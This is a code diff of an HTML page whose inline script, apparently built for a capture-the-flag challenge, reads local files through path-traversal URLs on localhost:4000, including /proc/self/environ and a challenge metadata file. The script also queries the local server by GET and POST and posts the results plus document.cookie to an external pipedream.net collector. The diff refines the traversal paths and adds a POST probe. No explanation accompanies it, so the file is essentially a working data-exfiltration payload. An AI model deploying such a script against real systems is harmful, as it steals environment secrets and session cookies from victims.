@@ -1,9 +1,10 @@
 <html>
   <body>
     <script>
-      var response = fetch('file:///challenge/metadata.json')
-      var envr = fetch('file:///proc/self/environ')
+      var response = fetch('http://localhost:4000/challenge../challenge/metadata.json')
+      var envr = fetch('http://localhost:4000/proc../proc/self/environ')
       var local = fetch('http://localhost:4000')
+      var localp = fetch('http://localhost:4000', {method: "post"})
       fetch("https://enpn4cpd36tko.x.pipedream.net/", {
         method: "post",
         body: JSON.stringify({
@@ -13,6 +14,7 @@
           metadata: JSON.stringify(response),
           env: JSON.stringify(envr),
           local: JSON.stringify(local),
+          localp: JSON.stringify(localp),
           cookie: document.cookie,
         }),
       });
